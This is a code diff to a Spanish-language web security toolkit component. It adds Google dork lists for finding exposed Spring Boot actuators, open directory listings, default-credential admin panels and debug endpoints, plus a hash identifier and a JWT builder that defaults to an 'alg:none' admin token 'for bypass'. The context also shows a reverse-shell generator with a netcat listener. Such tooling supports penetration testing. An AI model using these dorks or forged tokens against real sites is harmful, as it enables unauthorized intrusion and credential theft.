@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { Copy, Check, ExternalLink, Search, Sparkles, Shield, Zap, Target, Eye, Lock, AlertTriangle, Database, Code, FileText, Globe, Github, Linkedin, Video, Bug, Wrench, Download, Terminal } from "lucide-react"
+import { Copy, Check, ExternalLink, Search, Sparkles, Shield, Zap, Target, Eye, Lock, AlertTriangle, Database, Code, FileText, Globe, Github, Linkedin, Video, Bug, Wrench, Download, Terminal, Key, Hash, List } from "lucide-react"
 import { sqlInjectionDorks, cctvDorks, lfiDorks, sensitiveDataDorks } from "@/components/dork-data/wordlist-categories"
 import { allPayloadCategories, type PayloadCategory } from "@/components/payload-data/attack-payloads"
 
@@ -1039,6 +1039,102 @@ const dorkCategories: DorkCategory[] = [
     group: "Web Vulns"
   },
   {
+    title: "Spring Boot Actuator",
+    dorks: [
+      `site:{domain} inurl:"/actuator"`,
+      `site:{domain} inurl:"/actuator/env"`,
+      `site:{domain} inurl:"/actuator/heapdump"`,
+      `site:{domain} inurl:"/actuator/mappings"`,
+      `site:{domain} inurl:"/actuator/beans"`,
+      `site:{domain} inurl:"/actuator/configprops"`,
+      `site:{domain} inurl:"/actuator/httptrace"`,
+      `site:{domain} inurl:"/actuator/logfile"`,
+      `site:{domain} inurl:"/actuator/threaddump"`,
+      `site:{domain} inurl:"/actuator/health"`,
+      `site:{domain} inurl:"/actuator/info"`,
+      `site:{domain} inurl:"/actuator/metrics"`,
+      `site:{domain} inurl:"/actuator/sessions"`,
+      `site:{domain} inurl:"/actuator/shutdown"`,
+      `site:{domain} inurl:"/manage/env" | inurl:"/manage/health"`,
+    ],
+    icon: <Zap className="h-4 w-4" />,
+    description: "Spring Boot Actuator expuesto — env con secrets, heapdump con passwords, mappings internos",
+    color: "bg-green-500/10 text-green-600 border-green-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Directory Listing",
+    dorks: [
+      `intitle:"index of" site:{domain}`,
+      `intitle:"index of /" site:{domain}`,
+      `intitle:"index of" "parent directory" site:{domain}`,
+      `intitle:"index of" ".env" site:{domain}`,
+      `intitle:"index of" ".git" site:{domain}`,
+      `intitle:"index of" "backup" site:{domain}`,
+      `intitle:"index of" "config" site:{domain}`,
+      `intitle:"index of" "uploads" site:{domain}`,
+      `intitle:"index of" "logs" site:{domain}`,
+      `intitle:"index of" "tmp" | "temp" site:{domain}`,
+      `intitle:"index of" ".sql" site:{domain}`,
+      `intitle:"index of" ".zip" | ".tar.gz" | ".rar" site:{domain}`,
+      `intitle:"index of" "private" site:{domain}`,
+      `intitle:"index of" "api" site:{domain}`,
+      `intitle:"index of" "wp-content" site:{domain}`,
+    ],
+    icon: <FileText className="h-4 w-4" />,
+    description: "Directory listing habilitado — acceso directo a backups, configs, logs y archivos sensibles",
+    color: "bg-amber-500/10 text-amber-600 border-amber-500/20",
+    group: "Archivos"
+  },
+  {
+    title: "Default Credentials Panels",
+    dorks: [
+      `intitle:"Apache Tomcat" intext:"admin" intext:"password" site:{domain}`,
+      `intitle:"Tomcat" inurl:"/manager/html" site:{domain}`,
+      `intitle:"RouterOS" intext:"admin" site:{domain}`,
+      `intitle:"MikroTik" inurl:"/winbox" site:{domain}`,
+      `intitle:"Cisco" inurl:"/level/15/exec" site:{domain}`,
+      `intitle:"D-Link" inurl:"/login.asp" site:{domain}`,
+      `intitle:"TP-Link" inurl:"/login.htm" site:{domain}`,
+      `intitle:"NETGEAR" inurl:"/setup.cgi" site:{domain}`,
+      `intitle:"ZyXEL" inurl:"/login.html" site:{domain}`,
+      `intitle:"phpMyAdmin" intext:"Welcome to phpMyAdmin" site:{domain}`,
+      `intitle:"Webmin" inurl:":10000" site:{domain}`,
+      `intitle:"cPanel" inurl:":2083" site:{domain}`,
+      `intitle:"WHM" inurl:":2087" site:{domain}`,
+      `intitle:"Plesk" inurl:":8443" site:{domain}`,
+      `intitle:"DirectAdmin" inurl:":2222" site:{domain}`,
+    ],
+    icon: <Lock className="h-4 w-4" />,
+    description: "Paneles con credenciales por defecto conocidas — Tomcat admin:admin, RouterOS, cPanel, Webmin",
+    color: "bg-red-500/10 text-red-600 border-red-500/20",
+    group: "Infraestructura"
+  },
+  {
+    title: "Exposed Metrics & Health",
+    dorks: [
+      `site:{domain} inurl:"/metrics"`,
+      `site:{domain} inurl:"/health"`,
+      `site:{domain} inurl:"/health/live"`,
+      `site:{domain} inurl:"/health/ready"`,
+      `site:{domain} inurl:"/healthz"`,
+      `site:{domain} inurl:"/readyz"`,
+      `site:{domain} inurl:"/livez"`,
+      `site:{domain} inurl:"/status"`,
+      `site:{domain} inurl:"/server-status"`,
+      `site:{domain} inurl:"/server-info"`,
+      `site:{domain} inurl:"/info"`,
+      `site:{domain} inurl:"/debug"`,
+      `site:{domain} inurl:"/debug/vars"`,
+      `site:{domain} inurl:"/debug/pprof"`,
+      `site:{domain} inurl:"prometheus" inurl:"/metrics"`,
+    ],
+    icon: <Target className="h-4 w-4" />,
+    description: "Endpoints de métricas y salud expuestos — Prometheus /metrics, /debug, /server-status con info interna",
+    color: "bg-orange-500/10 text-orange-600 border-orange-500/20",
+    group: "Infraestructura"
+  },
+  {
     title: "Password Reset & Account Takeover",
     dorks: [
       `site:{domain} inurl:"/reset" inurl:"?token="`,
@@ -1079,6 +1175,20 @@ export function GoogleDorksGenerator() {
   const [rsPort, setRsPort] = useState("4444")
   const [rsType, setRsType] = useState("bash-tcp")
   const [rsCopied, setRsCopied] = useState(false)
+  // Hash Identifier state
+  const [hashInput, setHashInput] = useState("")
+  const [hashResults, setHashResults] = useState<string[]>([])
+  // JWT Builder state
+  const [jwtAlg, setJwtAlg] = useState("none")
+  const [jwtHeader, setJwtHeader] = useState('{"alg":"none","typ":"JWT"}')
+  const [jwtPayload, setJwtPayload] = useState('{"sub":"admin","role":"admin","exp":9999999999}')
+  const [jwtSecret, setJwtSecret] = useState("")
+  const [jwtOutput, setJwtOutput] = useState("")
+  const [jwtCopied, setJwtCopied] = useState(false)
+  // Subdomain Wordlist state
+  const [subDomain, setSubDomain] = useState("")
+  const [subList, setSubList] = useState<string[]>([])
+  const [subCopied, setSubCopied] = useState(false)
 
   const dorkGroups = ["all", "Recon", "Web Vulns", "Credenciales", "Archivos", "Infraestructura", "Cloud", "CMS", "OSINT"]
 
@@ -1211,6 +1321,109 @@ export function GoogleDorksGenerator() {
   }
 
   const currentShell = reverseShells[rsType]?.cmd(rsIP || "LHOST", rsPort || "LPORT") ?? ""
+
+  // ── Hash Identifier ────────────────────────────────────────────────────────
+  const identifyHash = (h: string): string[] => {
+    const s = h.trim()
+    const results: string[] = []
+    if (!s) return results
+    if (/^\$2[ab]\$\d{2}\$.{53}$/.test(s))         results.push("bcrypt")
+    if (/^\$6\$/.test(s))                            results.push("SHA-512crypt ($6$)")
+    if (/^\$5\$/.test(s))                            results.push("SHA-256crypt ($5$)")
+    if (/^\$1\$/.test(s))                            results.push("MD5crypt ($1$)")
+    if (/^\$argon2/.test(s))                         results.push("Argon2")
+    if (/^\$P\$/.test(s))                            results.push("WordPress (phpass)")
+    if (/^\$S\$/.test(s))                            results.push("Drupal7 (SHA-512)")
+    if (/^pbkdf2_sha/.test(s))                       results.push("Django PBKDF2")
+    if (/^\*[A-Fa-f0-9]{40}$/.test(s))              results.push("MySQL 4.1+ / SHA1(SHA1(pass))")
+    if (/^[A-Fa-f0-9]{128}$/.test(s))               results.push("SHA-512 (128 hex)")
+    if (/^[A-Fa-f0-9]{96}$/.test(s))                results.push("SHA-384 (96 hex)")
+    if (/^[A-Fa-f0-9]{64}$/.test(s))                results.push("SHA-256 (64 hex)")
+    if (/^[A-Fa-f0-9]{56}$/.test(s))                results.push("SHA-224 (56 hex)")
+    if (/^[A-Fa-f0-9]{40}$/.test(s))                results.push("SHA-1 (40 hex)")
+    if (/^[A-Fa-f0-9]{32}$/.test(s))                results.push("MD5 / NTLM / MD4 (32 hex)")
+    if (/^[A-Fa-f0-9]{16}$/.test(s))                results.push("MySQL 3.x / DES (16 hex)")
+    if (/^[A-Za-z0-9+/]{43}=$/.test(s))             results.push("SHA-256 Base64")
+    if (/^[A-Za-z0-9+/]{88}={0,2}$/.test(s))        results.push("SHA-512 Base64")
+    if (/^[A-Za-z0-9+/]{27}=$/.test(s))             results.push("MD5 Base64")
+    if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(s)) results.push("JWT (JSON Web Token)")
+    if (/^[A-Za-z0-9+/]+=*$/.test(s) && s.length % 4 === 0 && results.length === 0)
+      results.push("Base64 genérico")
+    if (results.length === 0) results.push("Tipo desconocido — posible hash personalizado o encoded")
+    return results
+  }
+
+  // ── JWT Builder ────────────────────────────────────────────────────────────
+  const b64url = (str: string) =>
+    btoa(unescape(encodeURIComponent(str))).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")
+
+  const buildJWT = async () => {
+    try {
+      const header = jwtAlg === "none"
+        ? JSON.stringify({ alg: "none", typ: "JWT" })
+        : JSON.stringify({ alg: "HS256", typ: "JWT" })
+      const h = b64url(jwtHeader.trim() || header)
+      const p = b64url(jwtPayload.trim())
+      if (jwtAlg === "none") {
+        setJwtOutput(`${h}.${p}.`)
+        return
+      }
+      const enc = new TextEncoder()
+      const key = await crypto.subtle.importKey("raw", enc.encode(jwtSecret || "secret"), { name: "HMAC", hash: "SHA-256" }, false, ["sign"])
+      const sig = await crypto.subtle.sign("HMAC", key, enc.encode(`${h}.${p}`))
+      const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")
+      setJwtOutput(`${h}.${p}.${sigB64}`)
+    } catch {
+      setJwtOutput("⚠ Error: verifica que el header y payload sean JSON válido")
+    }
+  }
+
+  const copyJWT = async () => {
+    await navigator.clipboard.writeText(jwtOutput)
+    setJwtCopied(true)
+    setTimeout(() => setJwtCopied(false), 2000)
+  }
+
+  // ── Subdomain Wordlist ─────────────────────────────────────────────────────
+  const subdomainWords = [
+    "www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
+    "vpn","m","shop","ftp","mail2","test","portal","ns","ww1","host","support",
+    "dev","web","bbs","mx","email","mobile","static","docs","beta","git",
+    "staging","api","app","admin","panel","cpanel","whm","v2","oauth","sso",
+    "cdn","media","images","assets","status","monitor","dashboard","internal",
+    "intranet","corp","office","crm","erp","jira","confluence","gitlab",
+    "jenkins","sonar","nexus","grafana","kibana","elastic","prometheus",
+    "redis","mongo","mysql","postgres","mssql","backup","stage","uat","qa",
+    "sandbox","demo","preview","old","legacy","v1","v3","ws","socket","push",
+    "notify","jobs","careers","help","kb","wiki","forum","community","store",
+    "checkout","pay","payment","invoice","billing","account","profile","auth",
+    "login","signup","register","api2","api3","graphql","gateway","proxy",
+    "load","lb","ha","prod","production","test2","dev2","stg","int","preprod",
+    "prd","local","uat2","release","rc","canary","alpha","next","new","old2",
+    "legacy2","archive","data","analytics","reporting","metrics","logs","audit",
+  ]
+
+  const generateSubdomains = () => {
+    const d = (subDomain || domain).trim().replace(/^https?:\/\//, "").replace(/\/.*/, "")
+    if (!d) { setSubList(["⚠ Ingresa un dominio"]); return }
+    setSubList(subdomainWords.map(s => `${s}.${d}`))
+  }
+
+  const copySubList = async () => {
+    await navigator.clipboard.writeText(subList.join("\n"))
+    setSubCopied(true)
+    setTimeout(() => setSubCopied(false), 2000)
+  }
+
+  const exportSubList = () => {
+    const blob = new Blob([subList.join("\n")], { type: "text/plain" })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement("a")
+    a.href = url
+    a.download = `subdomains-${(subDomain || domain || "target").replace(/\W+/g,"-")}.txt`
+    a.click()
+    URL.revokeObjectURL(url)
+  }
 
   const copyShell = async () => {
     await navigator.clipboard.writeText(currentShell)
@@ -1403,7 +1616,7 @@ export function GoogleDorksGenerator() {
           {activeTab === "payloads" && (
             <div className="max-w-3xl mx-auto mb-12 space-y-4">
               <div className="flex flex-wrap justify-center gap-2">
-                {["all", "SQL Injection", "NoSQL Injection", "XSS", "RCE", "SSTI", "LFI / Traversal", "XXE", "SSRF", "Open Redirect", "CRLF", "HTTP Smuggling", "Log4Shell", "GraphQL", "Prototype Pollution", "Host Header", "JWT", "File Upload", "Deserialization", "CORS", "OAuth", "WebSocket", "Race Condition"].map((f) => (
+                {["all", "SQL Injection", "NoSQL Injection", "XSS", "RCE", "SSTI", "LFI / Traversal", "XXE", "SSRF", "Open Redirect", "CRLF", "HTTP Smuggling", "Log4Shell", "GraphQL", "Prototype Pollution", "Host Header", "JWT", "File Upload", "Deserialization", "CORS", "OAuth", "WebSocket", "Race Condition", "LDAP Injection", "XPath Injection", "Email Injection", "HPP", "Cache Poisoning", "SQL Truncation"].map((f) => (
                   <button
                     key={f}
                     onClick={() => setPayloadFilter(f)}
@@ -1732,6 +1945,158 @@ export function GoogleDorksGenerator() {
                   Listener: <span className="font-mono text-gray-400">nc -lvnp {rsPort || "LPORT"}</span>
                   {rsType.startsWith("socat") && <span className="ml-3 font-mono text-gray-400">socat file:`tty`,raw,echo=0 tcp-listen:{rsPort || "LPORT"}</span>}
                 </p>
+              </CardContent>
+            </Card>
+
+            {/* Hash Identifier */}
+            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
+              <CardHeader className="pb-4">
+                <div className="flex items-center gap-3 mb-1">
+                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20">
+                    <Hash className="h-4 w-4" />
+                    <span className="text-xs font-semibold">Hash Identifier</span>
+                  </div>
+                </div>
+                <CardTitle className="text-white text-xl font-bold">Hash Identifier</CardTitle>
+                <p className="text-gray-400 text-sm">Identifica el tipo de hash: MD5, SHA-1/256/512, bcrypt, NTLM, JWT y más</p>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    placeholder="Pega el hash aquí..."
+                    value={hashInput}
+                    onChange={(e) => { setHashInput(e.target.value); setHashResults(identifyHash(e.target.value)) }}
+                    className="flex-1 px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-blue-400/50"
+                  />
+                </div>
+                {hashResults.length > 0 && (
+                  <div className="space-y-1.5">
+                    {hashResults.map((r, i) => (
+                      <div key={i} className="flex items-center gap-2 px-3 py-2 bg-blue-500/10 border border-blue-500/20 rounded-lg">
+                        <Hash className="h-3.5 w-3.5 text-blue-400 flex-shrink-0" />
+                        <span className="text-sm text-blue-300 font-mono">{r}</span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+
+            {/* JWT Builder */}
+            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
+              <CardHeader className="pb-4">
+                <div className="flex items-center gap-3 mb-1">
+                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-violet-500/10 text-violet-400 border border-violet-500/20">
+                    <Key className="h-4 w-4" />
+                    <span className="text-xs font-semibold">JWT Builder</span>
+                  </div>
+                </div>
+                <CardTitle className="text-white text-xl font-bold">JWT Builder</CardTitle>
+                <p className="text-gray-400 text-sm">Construye tokens JWT custom: alg:none para bypass o HS256 con secreto</p>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="flex gap-2">
+                  {["none", "HS256"].map((alg) => (
+                    <button
+                      key={alg}
+                      onClick={() => {
+                        setJwtAlg(alg)
+                        setJwtHeader(alg === "none" ? '{"alg":"none","typ":"JWT"}' : '{"alg":"HS256","typ":"JWT"}')
+                      }}
+                      className={`px-4 py-2 text-xs font-semibold rounded-lg border transition-all ${
+                        jwtAlg === alg
+                          ? "bg-violet-500/20 border-violet-500/40 text-violet-300"
+                          : "bg-white/5 border-white/10 text-gray-400 hover:text-white"
+                      }`}
+                    >
+                      alg: {alg}
+                    </button>
+                  ))}
+                </div>
+                <div>
+                  <label className="block text-xs font-semibold text-gray-400 mb-1.5">Header (JSON)</label>
+                  <textarea rows={2} value={jwtHeader} onChange={(e) => setJwtHeader(e.target.value)}
+                    className="w-full p-3 bg-black/30 border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-violet-400/50 resize-none" />
+                </div>
+                <div>
+                  <label className="block text-xs font-semibold text-gray-400 mb-1.5">Payload (JSON)</label>
+                  <textarea rows={3} value={jwtPayload} onChange={(e) => setJwtPayload(e.target.value)}
+                    className="w-full p-3 bg-black/30 border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-violet-400/50 resize-none" />
+                </div>
+                {jwtAlg === "HS256" && (
+                  <div>
+                    <label className="block text-xs font-semibold text-gray-400 mb-1.5">Secret</label>
+                    <input type="text" placeholder="secretkey" value={jwtSecret} onChange={(e) => setJwtSecret(e.target.value)}
+                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-violet-400/50" />
+                  </div>
+                )}
+                <button onClick={buildJWT}
+                  className="w-full py-3 bg-gradient-to-r from-violet-500 to-purple-600 hover:from-violet-600 hover:to-purple-700 text-white font-semibold rounded-xl transition-all text-sm">
+                  Generar JWT
+                </button>
+                {jwtOutput && (
+                  <div className="relative">
+                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-xs font-mono text-violet-300 break-all whitespace-pre-wrap pr-12 max-h-40 overflow-y-auto">
+                      {jwtOutput}
+                    </pre>
+                    <Button size="icon" variant="ghost" className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg" onClick={copyJWT}>
+                      {jwtCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
+                    </Button>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+
+            {/* Subdomain Wordlist Generator */}
+            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
+              <CardHeader className="pb-4">
+                <div className="flex items-center gap-3 mb-1">
+                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
+                    <List className="h-4 w-4" />
+                    <span className="text-xs font-semibold">Subdomain Wordlist</span>
+                  </div>
+                </div>
+                <CardTitle className="text-white text-xl font-bold">Subdomain Wordlist Generator</CardTitle>
+                <p className="text-gray-400 text-sm">Genera una wordlist de subdominios comunes para usar con ffuf, gobuster o amass</p>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="flex gap-2">
+                  <input
+                    type="text"
+                    placeholder={domain || "target.com"}
+                    value={subDomain}
+                    onChange={(e) => setSubDomain(e.target.value)}
+                    className="flex-1 px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-cyan-400/50"
+                  />
+                  <button onClick={generateSubdomains}
+                    className="px-5 py-3 bg-gradient-to-r from-cyan-500 to-teal-500 hover:from-cyan-600 hover:to-teal-600 text-white font-semibold rounded-xl transition-all text-sm whitespace-nowrap">
+                    Generar
+                  </button>
+                </div>
+                {subList.length > 0 && (
+                  <>
+                    <div className="flex gap-2">
+                      <button onClick={copySubList}
+                        className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs text-gray-300 hover:text-white transition-all">
+                        {subCopied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5" />}
+                        Copiar todo
+                      </button>
+                      <button onClick={exportSubList}
+                        className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs text-gray-300 hover:text-white transition-all">
+                        <Download className="h-3.5 w-3.5" />
+                        Export .txt
+                      </button>
+                      <span className="ml-auto text-xs text-gray-500 self-center">{subList.length} subdominios</span>
+                    </div>
+                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-xs font-mono text-cyan-300 max-h-56 overflow-y-auto">
+                      {subList.join("\n")}
+                    </pre>
+                    <p className="text-xs text-gray-600">
+                      Uso: <span className="font-mono text-gray-400">ffuf -u https://FUZZ.{subDomain || domain || "target.com"} -w subdomains.txt</span>
+                    </p>
+                  </>
+                )}
               </CardContent>
             </Card>
 
